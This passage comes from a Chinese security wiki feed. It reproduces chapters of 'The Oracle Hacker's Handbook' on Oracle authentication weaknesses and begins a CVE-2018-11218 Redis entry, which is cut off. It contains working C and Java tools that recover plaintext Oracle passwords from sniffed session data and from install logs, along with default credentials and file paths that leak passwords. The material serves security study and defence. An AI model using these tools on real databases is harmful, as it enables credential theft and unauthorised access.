Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      03 1f 00 00 06 00 00 00 00 00 03 73 03 b0 5f df             s _</span><br><span class="line">      00 06 00 00 00 01 01 00 00 1c da 12 00 07 00 00</span><br><span class="line">      00 88 d6 12 00 3c dc 12 00 06 73 79 73 74 65 6d       &lt;    system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f       AUTH_PASSWO</span><br><span class="line">      52 44 11 00 00 00 11 36 36 36 43 41 46 45 36 37  RD     666CAFE67</span><br><span class="line">      34 39 43 39 44 37 37 30 00 00 00 00 0d 00 00 00  49C9D770</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        服务器通过调用oracommon库中的kzsrdep（）函数，以用作密钥的机密数字解密AUTH_PASSWORD。服务器现在拥有明文密码的副本。然后，服务器创建密码哈希，并将其与数据库中的哈希进行比较。如果它们匹配，则对用户进行身份验证。然后由服务器执行检查，以确定用户是否具有CREATE SESSION特权；如果是这样，则授予用户访问数据库服务器的权限。</p><p>​        针对Windows NT上运行的Oracle 8.1.7.4执行了此分析。尽管实际的函数名称可能有所不同，但其他Oracle版本上的一般过程相同。</p><p>​        简要返回AUTH_PASSWORD，由于密码的加密方式，您可以获取有关密码长度的信息。如果AUTH_PASSWORD为16个字符长，则实际密码为8个字符或更少。如果用户的密码长度在9到16个字符之间，则AUTH_PASSWORD的长度是32个字符，依此类推。因此，如果攻击者可以嗅探整个网络上的身份验证，那么他们可以派生出可能在密码破解尝试中有用的信息。</p><h3 id="攻击加密过程"><a href="#攻击加密过程" class="headerlink" title="攻击加密过程"></a>攻击加密过程</h3><p>​        从数据库中获取密码哈希值是一项简单的任务，正如本书所展示的。可以执行强行强制Oracle密码散列，但是密码越长，花费的时间就越长。对于很长的密码，不是强行使用密码，而是另一种攻击方法，目的是快速获取明文。如果拥有哈希但想要纯文本的攻击者可以嗅探网络上的AUTH_SESSKEY和AUTH_PASSWORD交换，那么他们可以立即获得纯文本密码。他们使用已知的哈希对AUTH_SESSKEY进行解密以获取密码。然后，他们使用此秘密数字解密AUTH_PASSWORD，然后解出明文-不管它有多长。嗅探交换是真正的问题-但这不应该被诸如“好吧，如果他们遇到了我的密码哈希并可以从网络上捕获流量的问题，那么我就会遇到更大的问题”。在交换环境中，针对ARP的攻击可能导致流量在本地线路上广播，这意味着每个人都可以捕获流量。当然，在普通广播网络上（例如，使用普通集线器的以太网），这不是问题，并且以混杂模式运行的嗅探器可以进行交换。客户端和服务器之间中间位置的主机或网关可能会受到威胁，并被用作战略嗅探器。是的，如果有人可以这样做，您确实会遇到很大的问题，但重点是攻击者可以并且可以这样做！</p><p>​        以下代码使用kzsrdec（）和kzsrdep（）函数获取给定密码哈希，AUTH_SESSKEY和AUTH_PASSWORD的明文密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">      C:\&gt;cl /TC opass.c</span><br><span class="line">      C:\&gt;opass E:\oracle\ora81\BIN\oracommon8.dll</span><br><span class="line">            EED9B65CCECDB2E9</span><br><span class="line">            DF0536A94ADEE746</span><br><span class="line">            36A2CB576171FEAD</span><br><span class="line"></span><br><span class="line">      Secret is CEAF9C221915EC3E</span><br><span class="line">      Password is password</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      FARPROC kzsrdec = NULL;</span><br><span class="line">      FARPROC kzsrdep = NULL;</span><br><span class="line">      HANDLE oracommon = NULL;</span><br><span class="line">      unsigned char dll_path[260]=&quot;&quot;;</span><br><span class="line">      unsigned char hash[40]=&quot;&quot;;</span><br><span class="line">      unsigned char sess[40]=&quot;&quot;;</span><br><span class="line">      unsigned char pass[260]=&quot;&quot;;</span><br><span class="line">      unsigned char o[20]=&quot;&quot;;</span><br><span class="line">      unsigned char pwd[200]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc!=5)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">           printf(&quot;\n\t*** Oracle Password Revealer ***\n\n&quot;);</span><br><span class="line">           printf(&quot;\tC:\\&gt;%s &quot;,argv[0]);</span><br><span class="line">           printf(&quot;path_to_oracommon.dll &quot;);</span><br><span class="line">           printf(&quot;password_hash auth_sesskey &quot;);</span><br><span class="line">           printf(&quot;auth_password\n\n&quot;);</span><br><span class="line">           printf(&quot;\tDavid Litchfield\n&quot;);</span><br><span class="line">           printf(&quot;\tdavid@databasesecurity.com\n&quot;);</span><br><span class="line">           printf(&quot;\t10th June 2006\n\n&quot;);</span><br><span class="line">           return 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     strncpy(dll_path,argv[1],256);</span><br><span class="line">     strncpy(hash,argv[2],36);</span><br><span class="line">     strncpy(sess,argv[3],36);</span><br><span class="line">     strncpy(pass,argv[4],256);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(hash,1)==0)</span><br><span class="line">           return printf(&quot;Error in the password hash.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(sess,1)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_sesskey.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(pass,0)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_password.\n&quot;);</span><br><span class="line"></span><br><span class="line">     oracommon = LoadLibrary(dll_path);</span><br><span class="line">     if(!oracommon)</span><br><span class="line">           return printf(&quot;Failed to load %s\n&quot;,dll_path);</span><br><span class="line"></span><br><span class="line">     kzsrdec = GetProcAddress(oracommon,&quot; kzsrdec&quot;);</span><br><span class="line">     if(!kzsrdec)</span><br><span class="line">           return printf(&quot;No address for kzsrdec.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdep = GetProcAddress(oracommon,&quot; kzsrdep&quot;);</span><br><span class="line">     if(!kzsrdep)</span><br><span class="line">           return printf(&quot;No address for kzsrdep.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdec(sess,o,hash);</span><br><span class="line"></span><br><span class="line">     printf(&quot;\nSecret is %.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\n&quot;,</span><br><span class="line">           o[0],o[1],o[2],o[3],o[4],o[5],o[6],o[7]);</span><br><span class="line"></span><br><span class="line">     kzsrdep(pwd,pass,strlen(pass),o);</span><br><span class="line"></span><br><span class="line">     printf(&quot;Password is %s\n&quot;,pwd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int StringToHex(char *str,int cnv)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      unsigned int len = 0, c=0,i=0;</span><br><span class="line">      unsigned char a=0,b=0;</span><br><span class="line">      unsigned char tmp[12]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      len = strlen(str);</span><br><span class="line">      if(len &gt; 16)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      while(c &lt; len)</span><br><span class="line">      &#123;</span><br><span class="line">            a = str[c++];</span><br><span class="line">            b = str[c++];</span><br><span class="line">            if(a &gt; 0x2F &amp;&amp; a &lt; 0x3A)</span><br><span class="line">                  a = a - 0x30;</span><br><span class="line">            else if(a &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  a = a - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  a = a - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            if(b &gt; 0x2F &amp;&amp; b &lt; 0x3A)</span><br><span class="line">                  b = b - 0x30;</span><br><span class="line">            else if(b &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  b = b - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  b = b - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            a = a &lt;&lt; 4;</span><br><span class="line">            a = a + b;</span><br><span class="line">            tmp[i]=a;</span><br><span class="line">            i ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      memset(str,0,len);</span><br><span class="line">      c=0;</span><br><span class="line">      if(cnv)</span><br><span class="line">      &#123;</span><br><span class="line">            while(c &lt; 8)</span><br><span class="line">            &#123;</span><br><span class="line">                  str[c+0]=tmp[c+3];</span><br><span class="line">                  str[c+1]=tmp[c+2];</span><br><span class="line">                  str[c+2]=tmp[c+1];</span><br><span class="line">                  str[c+3]=tmp[c+0];</span><br><span class="line">                  c = c + 4;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return 1;</span><br><span class="line">      &#125;</span><br><span class="line">      while(c &lt; 8)</span><br><span class="line">      &#123;</span><br><span class="line">            str[c]=tmp[c];</span><br><span class="line">            c = c ++;</span><br><span class="line">      &#125;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="默认的用户名和密码"><a href="#默认的用户名和密码" class="headerlink" title="默认的用户名和密码"></a>默认的用户名和密码</h3><p>​        Oracle的默认用户名和密码，较常见的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS/CHANGE_ON_INSTALL</span><br><span class="line">SYSTEM/MANAGER</span><br><span class="line">DBSNMP/DBSNMP</span><br><span class="line">CTXSYS/CTXSYS</span><br><span class="line">MDSYS/MDSYS</span><br><span class="line">SCOTT/TIGER</span><br></pre></td></tr></table></figure><p>​        虽然查找带有默认密码的SYS或SYSTEM帐户并不常见，但通常发现DBSNMP（智能代理帐户）保留了默认密码。这可能是因为如果您仍然希望智能代理能够工作，则需要在两个位置更改密码。第一次密码更改发生在数据库中；第二个密码更改需要在snmp_rw.ora文件中进行。 CTXSYS和MDSYS都是9i中的DBA，尽管它们的默认密码与DBSNMP一样少，但通常也会保留其默认密码。</p><p>​        随着10g的发布，情况大为改善。在安装过程中，系统会提示安装程序输入SYS帐户的密码。然后，也可以为SYSTEM，DBSNMP和SYSMAN帐户设置相同的密码。所有其他帐户都设置为EXPIRED和LOCKED。 EXPIRED表示默认密码已过期，必须更改。但是，对于默认帐户和默认配置文件，可以将密码更改为原始密码。人们通常会这样做，因此使用硬编码密码的较早的应用程序仍然可以正常工作。</p><p>​        尽管10g的密码情况有所改善，但是仍然存在风险。 这样的风险之一是在安装过程中选择的密码会写入某些文件。 例如，在10g第1版中，SYSMAN的密码以明文形式写入$ ORACLE_HOME / hostname_sid / sysman / config目录中的emoms.properties文件中； 10g第2版使用DES加密密码，但是emoms文件还包含解密密钥，因此仍可以检索密码：只需将emdRepPwd和emdRepPwdSeed属性插入最近的DES工具中，然后弹出明文密码。</p><p>​        另一个可能记录密码的潜在文件是DBCreation.log。 假设在安装过程中安装程序选择了一个难以猜测的密码，其中带有感叹号。 设置SYSMAN和DBSNMP帐户的密码后，执行此操作的SQL脚本将执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter user SYSMAN identified by f00bar!! account unlock</span><br><span class="line"></span><br><span class="line">alter user DBSNMP identified by f00bar!! account unlock</span><br></pre></td></tr></table></figure><p>​        由于有感叹号，这会导致错误，然后将其记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line"></span><br><span class="line">ORA-00922: missing or invalid option</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/6.png"></p><p>​        因为SYS和SYSTEM帐户的密码是以不同的方式设置的-一种不会引起错误的方式-因此为他们提供了密码。 因此，如果某人可以访问此文件，则他们可能能够发现SYS和SYSTEM的密码。</p><p>​        记录密码的另一组文件是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/CfmLogger_install_date.log</span><br><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/oracle.assistants.server_install_date.log</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME/cfgtoollogs/configToolAllCommands</span><br><span class="line">$ORACLE_HOME/inventory/Components21/oracle.assistants.server/10.2.0.1.0/</span><br><span class="line">context.xml</span><br><span class="line">$ORACLE_HOME/inventory/ContentsXML/ConfigXML/oracle.assistants.server.10</span><br><span class="line">_2_0_1_0.CFM.1.inst.xml</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME\cfgtoollogs\oui\installActions_install_date.log (Windows</span><br><span class="line">only)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        其中install_date指定服务器的安装日期和时间。 但是，这些密码被混淆并显示如下：05da3f3b20f9ee5e1e992d7d35d5c0c679，但是从中恢复明文密码是一件很简单的事情。 SYS，SYSTEM，SYSMAN和DBSNMP的密码都可以从这些文件中恢复。 以下Java调用Checksum包中的Checksum SHA函数。 请注意，该功能不执行SHA操作。 混淆密码中的前导05表示使用DES解密的代码。 接下来的16个字符构成密钥，接下来的16个字符构成密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">$ cp DumpPassword.java /tmp/DumpPassword.java</span><br><span class="line">$ cd /tmp</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/javac -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ /tmp/DumpPassword.java</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/java -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ DumpPassword</span><br><span class="line">05da3f3b20f9ee5e1e992d7d35d5c0c679</span><br><span class="line">Password is foobar</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import oracle.security.misc.Checksum;</span><br><span class="line"></span><br><span class="line">class DumpPassword</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">        &#123;</span><br><span class="line">            byte b_in[] = HexToByteArray(args[0]);</span><br><span class="line">            try</span><br><span class="line">              &#123;</span><br><span class="line">                      /* Whilst it says SHA - it&#x27;s not!!! */</span><br><span class="line">                  byte b_out[] = Checksum.SHA(b_in, null);</span><br><span class="line">                  System.out.println</span><br><span class="line">(&quot;Password is &quot;+ ByteToHex(b_out));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch(Exception e)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.out.println(&quot;error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      public static String ByteToHex(byte a[])</span><br><span class="line">        &#123;</span><br><span class="line">            String s=&quot;&quot;;</span><br><span class="line">            for(int i=0; i&lt;a.length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                  s+=(char)a[ i ];</span><br><span class="line">            &#125;</span><br><span class="line">            return s;</span><br><span class="line">      &#125;</span><br><span class="line">      public static byte[] HexToByteArray(String str)</span><br><span class="line">      &#123;</span><br><span class="line">            if(str == null)</span><br><span class="line">                      return new byte[0];</span><br><span class="line">            int len = str.length();</span><br><span class="line">            char hex[] = str.toCharArray();</span><br><span class="line">            byte buf[] = new byte[len / 2];</span><br><span class="line">            for(int pos = 0; pos &lt; len / 2; pos++)</span><br><span class="line">                buf[pos] = (byte)(toData(hex[2 * pos]) &lt;&lt; 4 &amp; 0xf0 |</span><br><span class="line">            toData(hex[2 * pos + 1]) &amp; 0xf);</span><br><span class="line">            return buf;</span><br><span class="line">        &#125;</span><br><span class="line">        private static byte toData(char c)</span><br><span class="line">      &#123;</span><br><span class="line">            if(&#x27;0&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;9&#x27;)</span><br><span class="line">                  return (byte)((byte)c - 48);</span><br><span class="line">            if(&#x27;a&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;f&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 97) + 10);</span><br><span class="line">            if(&#x27;A&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;F&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 65) + 10);</span><br><span class="line">            else</span><br><span class="line">                  return -1;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        安装10g应用服务器并浏览文件后，发现以下内容也以相同的方式混淆了密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME\inventory\ContentsXML\configtools.xml</span><br><span class="line">$ORACLE_HOME\cfgtoollogs\configtoolsinstalldate.log</span><br><span class="line">$ORACLE_HOME\sysman\emd\targets.xml</span><br><span class="line">$ORACLE_HOME\config\ias.properties</span><br></pre></td></tr></table></figure><h3 id="用户名和密码暴力破解"><a href="#用户名和密码暴力破解" class="headerlink" title="用户名和密码暴力破解"></a>用户名和密码暴力破解</h3><p>​        如前所述，当用户尝试向数据库服务器进行身份验证时，它将发出一个挑战-用来加密密码的会话密钥。仅当帐户实际存在时才会发生，因此可以枚举数据库服务器中的帐户。例如，假设我们要确定是否存在一个名为“ HELPDESK”的帐户。为此，我们可以简单地尝试登录服务器-如果服务器向您提出挑战，则该帐户存在。如果未发出质询，则该帐户不存在。尽管这只是一个信息问题，但它泄漏了足够的信息，从而使攻击者知道该帐户是否存在，从而使对SYS和SYSTEM以外的帐户的暴力登录尝试更加可行。可以通过帐户锁定和确保使用强密码来击败暴力登录尝试-有关如何启用此功能的更多信息，请参见数据库黑客手册中的“保护Oracle”一章。在使用优化的蛮力工具进行的实验室测试中，可以执行c。每秒10次登录尝试。</p><p>长用户名缓冲区溢出<br>​        2003年2月，Mark Litchfield发现，所有OS上的所有版本的Oracle（9iR2和更早版本）在身份验证过程中都容易受到缓冲区溢出漏洞的攻击。通过在登录时传递一个过长的用户名，该用户名被复制到一个基于堆栈的缓冲区中，该缓冲区溢出，从而覆盖关键的程序控制信息。利用此漏洞，攻击者可以完全控制数据库服务器。 Oracle提供了针对此问题的补丁程序，但仍然很普遍，在那里找到容易受到此类攻击的未打补丁的系统。我听说过一个有关此漏洞的故事，但它可能是那些城市传奇之一。显然，一位Oracle副总裁对他们的代码可能包含这样的错误并为开发人员所用而感到愤怒，要求知道谁负责。他悄悄地得知自己是：漏洞隐藏得很久了，直到VP在Oracle还是一名初级程序员时才编写代码。此溢出已在警报51中修复。</p><p>​        在Mark Litchfield发现用户名缓冲区溢出的同一年，在Oracle XML数据库的身份验证过程中发现了更多的溢出。 XML数据库通过TCP端口2100上的FTP和端口8080上的HTTP提供服务。两者都容易受到过长的用户名缓冲区溢出和过长的密码缓冲区溢出的影响。 XML数据库中的这些问题和其他问题是在Blackhat Security Briefings上进行的有关Linux与Windows漏洞利用技术之间的区别的演讲的基础。可以在<a href="http://www.ngssoftware.com/papers/exploitvariation.pdf%E4%B8%8A%E6%89%BE%E5%88%B0%E6%9C%AC%E6%96%87%E7%9A%84%E5%89%AF%E6%9C%AC%E3%80%82%E8%BF%99%E4%BA%9B%E7%BC%BA%E9%99%B7%E7%9A%84%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F%E4%BA%8E2003%E5%B9%B48%E6%9C%8818%E6%97%A5%E5%9C%A8Alert">www.ngssoftware.com/papers/exploitvariation.pdf上找到本文的副本。这些缺陷的补丁程序于2003年8月18日在Alert</a> 58中发布。</p><p>Windows XP上有关Oracle的说明<br>        如果将Oracle安装在Windows XP上（例如，开发人员的工具箱），则如果用户是ORA_DBA本地组的成员，则他们可以作为SYSDBA连接到数据库服务器，而无需提供SYS用户的密码。在处理这种登录时，Oracle使用NTLM SSPI AcceptSecurityContext（）函数。如果用户提供了正确的用户名和密码，则此函数返回0并创建一个令牌。这样做的问题是，如果启用了简单文件共享，则所有登录尝试均会成功-该用户将被验证为来宾用户。但是，就Oracle而言，认证原则不是“来宾”，而是远程用户认证时作为用户名提供的任何内容。如果他们提供的用户名是ORA_DBA组中有效用户的名称，则Oracle对用户进行身份验证并授予他们SYSDBA访问权限-真诚地假设远程用户必须具有正确的密码，例如AcceptSecurity。 Context（）“说”它们已成功通过身份验证。攻击者所需要做的就是发现ORA_DBA组成员的名称，并在自己的系统上创建一个具有相同名称的用户。由于密码无关紧要，因此攻击者可以以SYSDBA的身份访问Oracle服务器。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;The  Oracle Hacker’s Handbook: Hacking and Defending Oracle&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by David  Litchfield John Wiley &amp;amp; Sons&lt;/s</summary>
      
    
    
    
    <category term="数据库安全" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-11218_Redis Lua缓冲区溢出漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T09:02:00.000Z</published>
    <updated>2021-07-06T09:14:57.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis Lua子系统缓冲区溢出漏洞</li><li>漏洞编号：CVE-2018-11218</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 3.2.12之前版本、4.0.10之前的4.x版本和5.0 RC2之前的5.x版本中的Lua子系统的cmsgpack库存在缓冲区溢出漏洞，该漏洞源于程序未能执行正确的内存操作。远程攻击者可通过发送请求利用该漏洞造成拒绝服务或执行任意代码。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者可以通过远程连接到redis-server服务器，发送命令执行cmsgpack.pack()函数，触发缓冲区溢出漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:Labs Redis up to 3.2.12<br>Redis:Labs Redis up to 4.0.10<br>Redis:Labs Redis up to 5.0 RC2</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0">https://github.com/redis/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" 